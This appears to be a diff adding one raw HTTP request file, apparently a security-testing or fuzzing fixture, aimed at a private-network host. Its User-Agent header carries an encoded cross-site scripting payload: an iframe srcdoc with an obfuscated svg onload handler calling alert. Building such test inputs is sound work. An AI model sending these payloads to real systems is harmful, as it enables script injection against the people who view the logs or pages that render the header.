@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <iframe srcdoc=<svg/o%26%23x6Eload%26equals%3Balert%26lpar%3B1)%26gt%3B>
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
